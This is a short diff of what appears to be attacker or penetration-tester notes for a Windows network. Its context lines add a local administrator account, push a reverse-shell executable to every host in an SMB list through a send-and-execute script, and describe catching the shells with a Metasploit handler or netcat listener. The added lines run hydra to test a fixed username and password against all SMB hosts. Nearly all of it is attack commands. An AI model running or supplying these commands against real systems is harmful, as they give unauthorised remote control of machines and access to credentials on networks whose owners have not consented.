@@ -45,3 +45,6 @@ net localgroup administrators chonker /add
 cat ../../smb-hosts.txt | xargs -L 1 -I {} ./send_and_execute.py {} kittenrevsh.exe
 ### This works with an msf multihandler, but nc -lvp 5150 and a quick ctrl-c will get a list built too
 
+
+#quick smb doublecheck for creds
+hydra -l chonker -p 5150kitten -M smb-hosts.txt smb
